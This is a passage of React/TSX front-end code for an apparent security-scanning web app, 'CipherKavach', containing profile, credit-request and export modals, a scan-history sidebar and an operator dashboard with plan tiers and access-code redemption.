              <form onSubmit={handleSaveProfile} className="p-8">
                <div className="flex flex-col items-center text-center mb-6">
                  <div className="w-14 h-14 rounded-2xl bg-blue-500/10 flex items-center justify-center mb-4 border border-blue-500/20 shadow-[0_0_20px_rgba(59,130,246,0.15)]">
                    <User className="w-7 h-7 text-blue-400" />
                  </div>
                  <h3 className="text-lg font-bold text-white tracking-tight">Edit Identity</h3>
                  <p className="text-gray-500 text-xs">Configure your Operator Profile across CipherKavach.</p>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="text-[10px] text-gray-500 uppercase font-bold tracking-widest mb-1.5 block">Display Name</label>
                    <input
                      type="text"
                      placeholder="e.g. Venugopal Rao"
                      value={editDisplayName}
                      onChange={e => setEditDisplayName(e.target.value)}
                      className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder:text-gray-600 outline-none focus:border-blue-500/60 focus:shadow-[0_0_0_2px_rgba(59,130,246,0.15)] transition-all font-mono"
                      required
                    />
                  </div>
                  <div>
                    <label className="text-[10px] text-gray-500 uppercase font-bold tracking-widest mb-1.5 block">Avatar URL (Optional)</label>
                    <input
                      type="url"
                      placeholder="https://example.com/avatar.png"
                      value={editAvatarUrl}
                      onChange={e => setEditAvatarUrl(e.target.value)}
                      className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder:text-gray-600 outline-none focus:border-blue-500/60 focus:shadow-[0_0_0_2px_rgba(59,130,246,0.15)] transition-all font-mono text-xs"
                    />
                  </div>
                </div>

                <div className="mt-6 flex gap-3">
                  <button type="button" onClick={() => setShowEditProfileModal(false)} className="flex-1 py-2.5 border border-white/10 bg-white/5 hover:bg-white/10 text-white font-bold rounded-xl transition-all text-xs">
                    Cancel
                  </button>
                  <button type="submit" disabled={isSavingProfile} className="flex-1 py-2.5 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl transition-colors text-xs disabled:opacity-60 flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(37,99,235,0.2)]">
                    {isSavingProfile ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : "Save Profile"}
                  </button>
                </div>
              </form>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Quota Request Modal */}
      <AnimatePresence>
        {showRequestCreditsModal && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-[80] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
            <motion.div initial={{ scale: 0.95, y: 10 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 10 }} className="bg-[#0f1219] border border-yellow-500/20 rounded-2xl max-w-md w-full shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-yellow-500 via-amber-500 to-orange-400" />
              <button onClick={() => setShowRequestCreditsModal(false)} className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors"><X className="w-5 h-5" /></button>

              <form onSubmit={handleRequestCredits} className="p-8">
                <div className="flex flex-col items-center text-center mb-6">
                  <div className="w-14 h-14 rounded-2xl bg-yellow-500/10 flex items-center justify-center mb-4 border border-yellow-500/20 shadow-[0_0_20px_rgba(234,179,8,0.15)]">
                    <Zap className="w-7 h-7 text-yellow-400" />
                  </div>
                  <h3 className="text-lg font-bold text-white tracking-tight">Request Runtime Quota</h3>
                  <p className="text-gray-500 text-xs">Submit an enterprise runtime credit allocation request.</p>
                </div>

                {requestSuccess ? (
                  <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="py-8 text-center space-y-3">
                    <div className="w-12 h-12 rounded-full bg-green-500/20 border border-green-500/30 flex items-center justify-center mx-auto text-green-400">
                      <CheckCircle2 className="w-6 h-6" />
                    </div>
                    <p className="text-sm font-bold text-white font-mono">Quota Request Dispatched</p>
                    <p className="text-xs text-gray-500 max-w-xs mx-auto">Your request has been filed in the system registry under PENDING status.</p>
                  </motion.div>
                ) : (
                  <div className="space-y-4">
                    {/* Read Only Stats */}
                    <div className="grid grid-cols-3 gap-3 bg-white/[0.03] border border-white/10 rounded-xl p-4 font-mono text-xs text-gray-300 select-none">
                      <div>
                        <p className="uppercase font-bold tracking-wider text-[10px] text-gray-400">Operator</p>
                        <p className="text-white font-bold truncate mt-1 text-xs" title={currentUser?.email || ""}>{currentUser?.email || "Unknown"}</p>
                      </div>
                      <div>
                        <p className="uppercase font-bold tracking-wider text-[10px] text-gray-400">Plan</p>
                        <span className={`inline-block text-[10px] font-black px-2 py-0.5 mt-1 rounded-full border ${isEnterprise ? "bg-purple-600/20 text-purple-300 border-purple-500/30" : "bg-white/5 text-gray-300 border-white/20"}`}>{isEnterprise ? "ENTERPRISE" : "STANDARD"}</span>
                      </div>
                      <div>
                        <p className="uppercase font-bold tracking-wider text-[10px] text-gray-400">Credits</p>
                        <p className="text-yellow-400 font-bold mt-1 text-xs">{userCredits} cr</p>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <label className="text-xs text-gray-300 uppercase font-bold tracking-wider mb-2 block">Requested Credits</label>
                        <input
                          type="number"
                          min="10"
                          max="1000"
                          value={requestCreditsAmt}
                          onChange={e => setRequestCreditsAmt(Math.max(10, Math.min(1000, Number(e.target.value))))}
                          className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder:text-gray-600 outline-none focus:border-yellow-500/60 focus:shadow-[0_0_0_2px_rgba(234,179,8,0.15)] transition-all font-mono"
                          required
                        />
                      </div>
                      <div>
                        <label className="text-xs text-gray-300 uppercase font-bold tracking-wider mb-2 block">Project Name (Opt)</label>
                        <input
                          type="text"
                          placeholder="e.g. Cyber scan MVP"
                          value={requestProjectName}
                          onChange={e => setRequestProjectName(e.target.value)}
                          className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder:text-gray-600 outline-none focus:border-yellow-500/60 focus:shadow-[0_0_0_2px_rgba(234,179,8,0.15)] transition-all font-mono"
                        />
                      </div>
                    </div>

                    <div>
                      <label className="text-xs text-gray-300 uppercase font-bold tracking-wider mb-2 block">Reason for Request</label>
                      <textarea
                        rows={3}
                        placeholder="Please describe why your system needs additional quota..."
                        value={requestReason}
                        onChange={e => setRequestReason(e.target.value)}
                        className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder:text-gray-600 outline-none focus:border-yellow-500/60 focus:shadow-[0_0_0_2px_rgba(234,179,8,0.15)] transition-all font-mono text-xs resize-none"
                        required
                      />
                    </div>

                    <div className="mt-6 flex gap-3">
                      <button type="button" onClick={() => setShowRequestCreditsModal(false)} className="flex-1 py-2.5 border border-white/10 bg-white/5 hover:bg-white/10 text-white font-bold rounded-xl transition-all text-xs">
                        Cancel
                      </button>
                      <button type="submit" disabled={isSubmittingRequest || !requestReason.trim()} className="flex-1 py-2.5 bg-yellow-600 hover:bg-yellow-500 text-black font-black rounded-xl transition-colors text-xs disabled:opacity-60 flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(234,179,8,0.2)]">
                        {isSubmittingRequest ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : "Submit Request"}
                      </button>
                    </div>
                  </div>
                )}
              </form>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Export Modal */}
      <AnimatePresence>
        {showExportModal && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-[60] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
            <motion.div initial={{ scale: 0.95 }} animate={{ scale: 1 }} exit={{ scale: 0.95 }} className="bg-[#0f1219] border border-white/10 p-6 rounded-2xl max-w-md w-full shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 to-purple-500"></div>
              <button onClick={() => setShowExportModal(false)} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5" /></button>

              <h3 className="text-xl font-bold mb-2">Export Intelligence Report</h3>
              <p className="text-gray-400 text-sm mb-6">Select your preferred export format.</p>

              <div className="grid grid-cols-2 gap-4">
                <button onClick={downloadText} disabled={isExporting} className="flex flex-col items-center justify-center gap-3 p-6 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 transition-colors disabled:opacity-50">
                  {isExporting ? <Loader2 className="w-8 h-8 text-red-400 animate-spin" /> : <FileText className="w-8 h-8 text-red-400" />}
                  <span className="font-semibold">Text (.txt)</span>
                </button>
                <button onClick={downloadMarkdown} disabled={isExporting} className="flex flex-col items-center justify-center gap-3 p-6 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 transition-colors disabled:opacity-50">
                  <FileDown className="w-8 h-8 text-blue-400" />
                  <span className="font-semibold">Markdown (.md)</span>
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* History Sidebar */}
      <AnimatePresence>
        {showHistory && (
          <motion.div initial={{ x: 300, opacity: 0 }} animate={{ x: 0, opacity: 1 }} exit={{ x: 300, opacity: 0 }} className="fixed inset-y-0 right-0 w-80 bg-[#0f1219] border-l border-white/10 z-50 p-6 shadow-2xl flex flex-col">
            <div className="flex items-center justify-between mb-6">
              <h3 className="font-bold text-lg flex items-center gap-2">
                <History className="w-5 h-5 text-blue-400" />
                {sidebarTab === "history" ? "Scan History" : "Saved Reports"}
              </h3>
              <button onClick={() => setShowHistory(false)} className="text-gray-400 hover:text-white"><X className="w-5 h-5" /></button>
            </div>

            {/* Cyberpunk Tab Selector */}
            <div className="flex gap-2 p-1 bg-black/40 border border-white/5 rounded-xl mb-6 shrink-0 font-mono">
              <button
                onClick={() => setSidebarTab("history")}
                className={`flex-1 py-2 text-xs font-black uppercase tracking-wider rounded-lg transition-all ${sidebarTab === "history"
                  ? "bg-blue-600/20 border border-blue-500/30 text-blue-300 shadow-[0_0_10px_rgba(59,130,246,0.1)]"
                  : "text-gray-400 hover:text-gray-200"
                  }`}
              >
                History ({history.length})
              </button>
              <button
                onClick={() => setSidebarTab("saved")}
                className={`flex-1 py-2 text-xs font-black uppercase tracking-wider rounded-lg transition-all ${sidebarTab === "saved"
                  ? "bg-yellow-500/20 border border-yellow-500/30 text-yellow-300 shadow-[0_0_10px_rgba(234,179,8,0.1)]"
                  : "text-gray-400 hover:text-gray-200"
                  }`}
              >
                Saved ({savedReports.length})
              </button>
            </div>

            <div className="flex-1 overflow-y-auto space-y-4 pr-2 custom-scrollbar">
              {firestoreRestricted && (
                <div className="p-3 bg-red-950/20 border border-red-500/30 rounded-xl text-xs text-red-400 font-mono space-y-1.5 shadow-[0_0_10px_rgba(239,68,68,0.1)]">
                  <div className="font-bold uppercase tracking-wider flex items-center gap-1.5 text-red-300">
                    <ShieldAlert className="w-3.5 h-3.5" /> Security Rules Restricted
                  </div>
                  <p className="leading-relaxed opacity-95">
                    Firestore rejected persistent operations (insufficient rules/permissions).
                  </p>
                  <p className="leading-relaxed font-bold text-gray-300">
                    Fix: Copy-paste the newly created <code className="bg-black/40 px-1 py-0.5 rounded text-yellow-400">firestore.rules</code> file in your project root into your Firebase Console Rules editor.
                  </p>
                </div>
              )}
              {sidebarTab === "history" ? (
                history.length === 0 ? (
                  <div className="text-center py-12 text-gray-600 font-mono text-xs">
                    No session history scans.
                  </div>
                ) : (
                  history.map((hist, i) => (
                    <div key={i} onClick={() => loadHistoryResult(hist)} className="glass-card p-4 rounded-xl border border-white/5 cursor-pointer hover:bg-white/10 transition-all hover:scale-[1.02]">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs text-gray-400 font-mono">{new Date(hist.timestamp || "").toLocaleTimeString()}</span>
                        <span className={`text-xs font-bold px-2 py-0.5 rounded border ${(hist.vulnerabilities || []).length > 0 ? "bg-red-500/20 text-red-400 border-red-500/30" : "bg-green-500/20 text-green-400 border-green-500/30"}`}>
                          {(hist.vulnerabilities || []).length} Vulns
                        </span>
                      </div>
                      <p className="text-sm font-medium truncate font-mono text-white/90">{hist.repoMetadata?.name || "package.json"}</p>
                    </div>
                  ))
                )
              ) : (
                savedReportsLoading ? (
                  <div className="flex items-center justify-center py-12">
                    <Loader2 className="w-6 h-6 animate-spin text-yellow-400" />
                  </div>
                ) : savedReports.length === 0 ? (
                  <div className="text-center py-12 text-gray-600 font-mono text-xs">
                    No saved persistent reports.
                  </div>
                ) : (
                  savedReports.map((report, i) => (
                    <div
                      key={report.id || i}
                      onClick={() => loadSavedReportResult(report)}
                      className="glass-card p-4 rounded-xl border border-white/5 cursor-pointer hover:bg-white/10 transition-all hover:scale-[1.02] relative group overflow-hidden"
                    >
                      <div className={`absolute top-0 left-0 w-[3px] h-full ${report.severity === "CRITICAL" ? "bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.6)]" :
                        report.severity === "HIGH" ? "bg-orange-500 shadow-[0_0_8px_rgba(249,115,22,0.6)]" :
                          report.severity === "MEDIUM" ? "bg-yellow-500 shadow-[0_0_8px_rgba(234,179,8,0.6)]" :
                            "bg-blue-500 shadow-[0_0_8px_rgba(59,130,246,0.6)]"
                        }`} />

                      <div className="flex items-center justify-between mb-2">
                        <span className="text-xs text-gray-400 font-mono">
                          {(() => {
                            const date = report.createdAt?.toDate?.() ? report.createdAt.toDate() : new Date(report.createdAt || 0);
                            return date.toLocaleDateString() + " " + date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                          })()}
                        </span>
                        <div className="flex items-center gap-1.5">
                          <span className={`text-[10px] font-black px-2 py-0.5 rounded border uppercase tracking-wide ${report.severity === "CRITICAL" ? "bg-red-500/20 text-red-400 border-red-500/30" :
                            report.severity === "HIGH" ? "bg-orange-500/20 text-orange-400 border-orange-500/30" :
                              report.severity === "MEDIUM" ? "bg-yellow-500/20 text-yellow-400 border-yellow-500/30" :
                                "bg-blue-500/20 text-blue-400 border-blue-500/30"
                            }`}>
                            {report.severity}
                          </span>

                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setReportToDelete({ id: report.id, type: "saved", repoName: report.repoName });
                            }}
                            className="p-1 rounded-lg hover:bg-red-500/20 text-gray-400 hover:text-red-400 transition-colors shrink-0"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                      <p className="text-sm font-medium truncate font-mono text-white/95">{report.repoName}</p>
                      <p className="text-xs text-gray-400 truncate mt-1">
                        By: <span className="text-gray-300 font-semibold">{report.displayName || "Operator"}</span>
                      </p>
                    </div>
                  ))
                )
              )}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* OPERATOR CONTROL CENTER — FULL PAGE MODAL */}
      <AnimatePresence>
        {showControlCenter && currentUser && (
          <motion.div
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[70] bg-[#030712]/95 backdrop-blur-xl overflow-y-auto"
          >
            {/* Background ambience */}
            <div className="fixed top-0 left-1/4 w-1/2 h-96 bg-blue-600/10 blur-[120px] rounded-full pointer-events-none" />
            <div className="fixed bottom-0 right-1/4 w-1/2 h-96 bg-purple-600/10 blur-[120px] rounded-full pointer-events-none" />
            <div className="fixed inset-0 bg-[url('/grid.svg')] bg-center opacity-[0.03] pointer-events-none" />

            <div className="relative z-10 max-w-7xl mx-auto px-6 py-8">
              {/* Header */}
              <div className="flex items-center justify-between mb-8">
                <div className="flex items-center gap-4">
                  <div className="w-10 h-10 rounded-xl bg-blue-500/20 flex items-center justify-center border border-blue-500/30 shadow-[0_0_20px_rgba(59,130,246,0.3)]">
                    <Shield className="w-6 h-6 text-blue-400" />
                  </div>
                  <div>
                    <h1 className="text-2xl font-black text-white tracking-tight">Operator Control Center</h1>
                    <p className="text-xs text-gray-500 font-mono uppercase tracking-widest">CipherKavach AI · Runtime Management Console</p>
                  </div>
                </div>
                <button onClick={() => setShowControlCenter(false)} className="flex items-center gap-2 text-gray-400 hover:text-white transition-colors border border-white/10 bg-white/5 hover:bg-white/10 px-4 py-2 rounded-xl text-sm font-medium">
                  <X className="w-4 h-4" /> Close
                </button>
              </div>

              {/* Row 1: Profile + Credits + Runtime Health */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-5 mb-5">

                {/* S1: Operator Profile */}
                <div className="glass-card p-6 rounded-2xl border border-white/5 relative overflow-hidden">
                  <div className="absolute inset-0 bg-blue-500/5 pointer-events-none" />
                  <div className="absolute top-0 right-0 w-32 h-32 bg-blue-500/10 blur-[60px] rounded-full pointer-events-none" />
                  <div className="flex items-center gap-4 relative z-10 mb-5">
                    <img src={computedAvatarUrl} alt="Avatar" className="w-16 h-16 rounded-full border-2 border-blue-500/30 shadow-[0_0_20px_rgba(59,130,246,0.25)] shrink-0 object-cover" />
                    <div className="overflow-hidden flex-1">
                      <p className="text-lg font-bold text-white truncate">
                        {userDoc?.displayName || currentUser.displayName || "Operator"}
                      </p>
                      <p className="text-xs text-gray-400 truncate">{currentUser.email}</p>
                      {isAdmin ? (
                        <span className="inline-flex items-center gap-1.5 text-[10px] font-black px-2.5 py-1 rounded-full mt-2 bg-gradient-to-r from-yellow-500/20 to-purple-500/20 border border-yellow-500/40 text-yellow-300">
                          <span className="w-1.5 h-1.5 rounded-full bg-yellow-400 animate-pulse" /> ADMIN — FULL AUTHORITY
                        </span>
                      ) : (
                        <div className="flex flex-col gap-1.5 mt-2">
                          <span className="inline-flex items-center gap-1.5 text-[10px] font-bold text-blue-400 bg-blue-500/10 border border-blue-500/20 px-2.5 py-1 rounded-full w-max">
                            <span className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse" /> {currentUser.email === DEMO_EMAIL ? "DEMO OPERATOR — TRIAL ACCESS" : isEnterprise ? "OPERATOR — ENTERPRISE" : "OPERATOR — FREE TIER"}
                          </span>
                          {!isAdmin && !isEnterprise && (
                            <span className="inline-flex items-center gap-1.5 text-[9px] font-bold text-yellow-400 bg-yellow-500/10 border border-yellow-500/20 px-2.5 py-0.5 rounded-full font-mono w-max">
                              ⚡ {(userDoc?.demoScansUsed ?? 0)} / 2 demos used
                            </span>
                          )}
                        </div>
                      )}
                    </div>
                  </div>
                  <div className="grid grid-cols-3 gap-2 relative z-10">
                    {[{ label: "Total Scans", val: String(history.length), color: "text-blue-400" }, { label: "Risk Posture", val: "Stable", color: "text-green-400" }, { label: "Credits", val: isAdmin ? "∞" : String(userCredits), color: "text-yellow-400" }].map(m => (
                      <div key={m.label} className="bg-black/40 rounded-xl p-3 text-center border border-white/5">
                        <p className="text-[10px] text-gray-400 uppercase font-bold tracking-wider">{m.label}</p>
                        <p className={`text-base font-mono font-bold ${m.color} mt-1`}>{m.val}</p>
                      </div>
                    ))}
                  </div>
                  <div className="flex items-center justify-between mt-4 pt-3 border-t border-white/5 relative z-10">
                    <p className="text-xs text-gray-400 font-mono"><span className="text-blue-400 font-bold">Status:</span> Connected</p>
                    <button onClick={openEditProfile} className="text-xs text-blue-400 hover:text-blue-300 font-bold uppercase tracking-wider flex items-center gap-1 bg-white/5 px-2.5 py-1 rounded-lg border border-white/10 hover:bg-white/10 transition-all">
                      ⚙ Edit Profile
                    </button>
                  </div>
                </div>

                {/* S2: AI Runtime Credits */}
                <div className="glass-card p-6 rounded-2xl border border-white/5 relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-28 h-28 bg-yellow-500/10 blur-[50px] rounded-full pointer-events-none" />
                  <div className="flex items-center gap-2 mb-5"><Zap className="w-5 h-5 text-yellow-400" /><span className="text-sm font-bold uppercase tracking-widest text-white">AI Runtime Credits</span></div>
                  <div className="space-y-3.5">
                    {!isAdmin && !isEnterprise && (
                      <div className="flex items-center justify-between py-1 bg-yellow-500/5 border border-yellow-500/20 rounded-xl px-3 text-xs font-mono mb-2">
                        <span className="text-yellow-400 font-bold">Demo Quota</span>
                        <span className="text-yellow-300 font-black">{(userDoc?.demoScansUsed ?? 0)} / 2 Scans Used</span>
                      </div>
                    )}
                    <div className="flex items-center justify-between"><span className="text-sm text-gray-400">Credits Remaining</span><span className="text-xl font-mono font-black text-yellow-400">{isAdmin ? "∞ Unlimited" : userCredits}</span></div>
                    <div className="w-full h-2.5 bg-white/5 rounded-full overflow-hidden"><div className="h-full bg-gradient-to-r from-yellow-500 to-green-400 rounded-full shadow-[0_0_10px_rgba(250,204,21,0.4)]" style={{ width: isAdmin ? "100%" : `${Math.min(100, (userCredits / 250) * 100)}%` }} /></div>
                    <div className="flex items-center justify-between"><span className="text-xs text-gray-400">Deep Threat Replays</span><span className="text-sm font-mono text-orange-400 font-bold">3 used</span></div>
                    <div className="flex items-center justify-between"><span className="text-xs text-gray-400">Runtime Efficiency</span><span className="text-sm font-mono text-green-400 font-bold">94%</span></div>
                    <div className="flex items-center justify-between"><span className="text-xs text-gray-400">Tokens Processed</span><span className="text-sm font-mono text-blue-300 font-bold">~18k</span></div>
                    <div className="pt-3 border-t border-white/5 text-xs text-gray-400 font-mono">Standard: 1cr · Replay: 3cr · Multi-Model: 5cr</div>
                    <button
                      onClick={() => setShowRequestCreditsModal(true)}
                      className="w-full mt-4 py-2.5 border border-yellow-500/30 bg-yellow-500/10 hover:bg-yellow-500/20 text-yellow-400 font-bold rounded-xl transition-all text-xs flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(234,179,8,0.15)] hover:shadow-[0_0_20px_rgba(234,179,8,0.25)]"
                    >
                      <Zap className="w-3.5 h-3.5" /> Request More Credits
                    </button>
                  </div>
                </div>

                {/* S5: Runtime Health */}
                <div className="glass-card p-6 rounded-2xl border border-white/5">
                  <div className="flex items-center gap-2 mb-5"><Activity className="w-5 h-5 text-green-400" /><span className="text-sm font-bold uppercase tracking-widest text-white">Runtime Health</span></div>
                  <div className="space-y-3.5">
                    {[{ label: "CascadeFlow", status: "Active" }, { label: "Telemetry", status: "Stable" }, { label: "AI Runtime", status: "Healthy" }, { label: "Groq Engine", status: "Online" }, { label: "OSV.dev Sync", status: "Connected" }].map((item) => (
                      <div key={item.label} className="flex items-center justify-between py-1 border-b border-white/[0.03] last:border-0">
                        <span className="text-sm text-gray-400">{item.label}</span>
                        <span className="flex items-center gap-2 text-xs font-mono text-green-400 font-bold">
                          <span className="w-2 h-2 rounded-full bg-green-400 shadow-[0_0_8px_rgba(74,222,128,0.9)] animate-pulse" />{item.status}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Row 2: AI Mode + Plan & Usage */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5 mb-5">

                {/* S3: AI Analysis Mode */}
                <div className="glass-card p-6 rounded-2xl border border-white/5">
                  <div className="flex items-center gap-2 mb-5"><BrainCircuit className="w-5 h-5 text-purple-400" /><span className="text-sm font-bold uppercase tracking-widest text-white">AI Analysis Mode</span></div>
                  <div className="space-y-2.5">
                    {[
                      { label: "Groq Fast Analysis", desc: "Optimized for speed. Best for standard dependency scans.", color: "text-green-400", border: "border-green-500/30", bg: "bg-green-500/10", active: true },
                      { label: "Claude Deep Analysis", desc: "Advanced reasoning. Ideal for complex threat chains.", color: "text-blue-400", border: "border-blue-500/20", bg: "", active: false },
                      { label: "Gemini Security Review", desc: "Multimodal intelligence. Best for code-level analysis.", color: "text-purple-400", border: "border-purple-500/20", bg: "", active: false },
                      { label: "Multi-Model Consensus", desc: "Triple verification. Reserved for CRITICAL severity cases.", color: "text-orange-400", border: "border-orange-500/20", bg: "", active: false },
                    ].map((mode) => (
                      <button key={mode.label} className={`w-full flex items-start justify-between px-4 py-3 rounded-xl border text-left transition-all gap-3 ${mode.active ? `${mode.bg} ${mode.border} shadow-[0_0_10px_rgba(74,222,128,0.1)]` : "border-white/5 hover:border-white/10 hover:bg-white/5"}`}>
                        <div>
                          <p className={`text-sm font-semibold ${mode.active ? "text-white" : "text-gray-400"}`}>{mode.label}</p>
                          <p className="text-xs text-gray-600 mt-0.5">{mode.desc}</p>
                        </div>
                        {mode.active && <span className={`text-[10px] font-black ${mode.color} shrink-0 mt-0.5 bg-white/5 px-2 py-0.5 rounded-full border ${mode.border}`}>ACTIVE</span>}
                      </button>
                    ))}
                  </div>
                </div>

                {/* S4: Plan & Usage — with active Free Tier highlighted */}
                <div className="glass-card p-6 rounded-2xl border border-white/5">
                  <div className="flex items-center gap-2 mb-5"><Layers className="w-5 h-5 text-purple-400" /><span className="text-sm font-bold uppercase tracking-widest text-white">Plan & Usage</span></div>
                  <div className="grid grid-cols-2 gap-4">
                    {/* Active or Enterprise Tier */}
                    <div className={`rounded-2xl p-4 relative ${isEnterprise ? "border-2 border-purple-500/60 bg-purple-500/15 shadow-[0_0_25px_rgba(168,85,247,0.2)]" : "border-2 border-blue-500/50 bg-blue-500/10 shadow-[0_0_20px_rgba(59,130,246,0.15)]"}`}>
                      <div className="absolute -top-3 left-4 text-[10px] font-black text-white px-2.5 py-0.5 rounded-full tracking-wider" style={{ background: isEnterprise ? "#9333ea" : "#2563eb" }}>ACTIVE</div>
                      <p className={`text-sm font-bold uppercase tracking-wider mb-3 ${isEnterprise ? "text-purple-300" : "text-blue-300"}`}>{isEnterprise ? "Enterprise" : "Free Tier"}</p>
                      <ul className="space-y-2">
                        {(isEnterprise
                          ? ["Unlimited Orchestration", "Multi-Model Consensus", "Continuous Monitoring", "Compliance Reports"]
                          : ["Standard Scans", "Limited Deep Analysis", "Basic Telemetry", "5 Saved Reports"]
                        ).map(f => (
                          <li key={f} className={`flex items-center gap-1.5 text-xs ${isEnterprise ? "text-purple-200" : "text-blue-200"}`}>
                            <CheckCircle2 className={`w-3.5 h-3.5 shrink-0 ${isEnterprise ? "text-purple-400" : "text-blue-400"}`} />{f}
                          </li>
                        ))}
                      </ul>
                    </div>
                    {/* Upgrade card — hidden when already enterprise */}
                    {!isEnterprise && (
                      <div className="rounded-2xl p-4 border border-purple-500/20 bg-purple-500/5 relative opacity-70 hover:opacity-100 transition-opacity">
                        <div className="absolute -top-3 left-4 text-[10px] font-black bg-purple-600 text-white px-2.5 py-0.5 rounded-full tracking-wider">UPGRADE</div>
                        <p className="text-sm font-bold text-purple-300 uppercase tracking-wider mb-3">Enterprise</p>
                        <ul className="space-y-2">
                          {["Unlimited Orchestration", "Multi-Model Consensus", "Continuous Monitoring", "Compliance Reports"].map(f => (
                            <li key={f} className="flex items-center gap-1.5 text-xs text-purple-300">
                              <CheckCircle2 className="w-3.5 h-3.5 text-purple-400 shrink-0" />{f}
                            </li>
                          ))}
                        </ul>
                        <p className="text-[10px] text-purple-500 font-mono mt-2">Redeem an access code to unlock</p>
                      </div>
                    )}
                  </div>

                  {/* Redeem Access Code — embedded in Plan & Usage */}
                  <div className="mt-4 pt-4 border-t border-white/5">
                    <div className="flex items-center gap-2 mb-3">
                      <Key className="w-3.5 h-3.5 text-cyan-400" />
                      <span className="text-xs font-bold text-white uppercase tracking-widest">Redeem Access Code</span>
                      {isEnterprise && <span className="ml-auto text-[9px] font-black bg-purple-600 text-white px-2 py-0.5 rounded-full">ENTERPRISE</span>}
                    </div>
                    <div className="flex gap-2">
                      <input
                        type="text" value={redeemCode}
                        onChange={e => { setRedeemCode(e.target.value.toUpperCase()); setRedeemStatus("idle"); }}
                        onKeyDown={e => e.key === "Enter" && handleRedeemCode()}
                        placeholder="Enter your access code"
                        className="flex-1 px-3 py-2 bg-white/5 border border-white/10 rounded-xl text-xs font-mono text-white placeholder:text-gray-600 outline-none focus:border-cyan-500/50 focus:shadow-[0_0_0_2px_rgba(34,211,238,0.15)] transition-all tracking-widest"
                      />
                      <button
                        onClick={handleRedeemCode}
                        disabled={redeemStatus === "loading" || !redeemCode.trim()}
                        className="px-3 py-2 bg-cyan-500/20 border border-cyan-500/30 hover:bg-cyan-500/30 text-cyan-400 rounded-xl transition-colors text-xs font-bold disabled:opacity-50 flex items-center gap-1.5"
                      >
                        {redeemStatus === "loading" ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Zap className="w-3.5 h-3.5" />}
                        Redeem
                      </button>
                    </div>
                    <AnimatePresence>
                      {redeemStatus === "success" && (
                        <motion.div initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="flex items-start gap-2 p-2.5 bg-green-500/10 border border-green-500/20 rounded-xl mt-2">
                          <CheckCircle2 className="w-3.5 h-3.5 text-green-400 mt-0.5 shrink-0" />
                          <div>
                            <p className="text-xs font-bold text-green-400">Code Activated!</p>
                            <p className="text-[10px] text-green-300/70 font-mono mt-0.5">{redeemMessage}</p>
                          </div>
                        </motion.div>
                      )}
                      {redeemStatus === "error" && (
                        <motion.div initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="flex items-start gap-2 p-2.5 bg-red-500/10 border border-red-500/20 rounded-xl mt-2">
                          <AlertCircle className="w-3.5 h-3.5 text-red-400 mt-0.5 shrink-0" />
                          <p className="text-[10px] text-red-300 font-mono">{redeemMessage}</p>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                </div>
              </div>

              {/* Row 3: CascadeFlow + Consensus + Performance + Budget */}
              <div className="grid grid-cols-1 md:grid-cols-4 gap-5 mb-5">

                {/* S7: CascadeFlow Routing */}
                <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden">
                  <div className="absolute inset-0 bg-[url('/grid.svg')] bg-center opacity-[0.02] pointer-events-none" />
                  <div className="flex items-center gap-2 mb-4"><Network className="w-4 h-4 text-cyan-400" /><span className="text-xs font-bold uppercase tracking-widest text-white">CascadeFlow</span></div>
                  <div className="relative space-y-1 before:absolute before:inset-y-0 before:left-[7px] before:w-px before:bg-gradient-to-b before:from-blue-500/50 before:via-purple-500/30 before:to-transparent">
